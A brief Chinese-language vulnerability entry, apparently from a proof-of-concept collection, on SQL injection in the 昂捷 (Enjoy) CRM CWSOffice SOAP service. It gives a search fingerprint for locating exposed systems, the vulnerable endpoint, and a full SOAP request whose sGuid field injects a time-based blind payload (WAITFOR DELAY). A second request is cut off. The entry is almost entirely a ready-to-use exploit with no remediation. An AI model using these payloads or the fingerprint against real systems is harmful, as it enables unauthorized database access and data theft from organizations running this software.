# 昂捷CRMCWSOffice存在多处SQL注入漏洞

- **系统**：昂捷　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="CheckSilverlightInstalled"`
- **请求**：`POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1`

**请求体 / payload**
```
PoC-1
Host:
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetDocTemplateByGuid"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetDocTemplateByGuid xmlns="http://tempuri.org/">
<sGuid>1';WAITFOR DELAY '0:0:5'--</sGuid>
</GetDocTemplateByGuid>
</soap:Body>
</soap:Envelope>
PoC-2
POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
Host:
Content-Type: text/xml; charset=utf-8
Conten…（脚本共 5638 字，完整版见原文）
```
- **预期**：200　|　—